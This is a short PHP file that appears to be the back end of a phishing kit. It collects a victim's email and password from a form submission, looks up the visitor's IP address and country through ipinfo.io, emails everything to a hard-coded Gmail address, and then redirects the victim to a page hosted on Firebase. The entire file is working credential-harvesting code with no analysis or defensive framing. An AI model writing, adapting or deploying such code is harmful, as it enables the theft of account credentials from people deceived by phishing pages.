<?php

//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

//get user's country address
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$message .= "Email: ".$_GET['email']."\n";
$message .= "Password: ".$_GET['password']."\n";
$message .= "User ip: ".$ip. "\n"; 
$message .= "Country: ".$details->country. "\n";
$message .= "Region: ".$details->region. "\n";
$message .= "------------Created by BusybrainTech------------\n";

$to = "busybraintech@gmail.com";

$hi = mail($to,"LOG | ".$details->country,$message);

header ("location: https://firebasestorage.googleapis.com/v0/b/rdetedw-bs3.appspot.com/o/modal.html?alt=media&token=8f5b15c6-411e-47dc-bcde-1e5d4aa3f4ea");

?>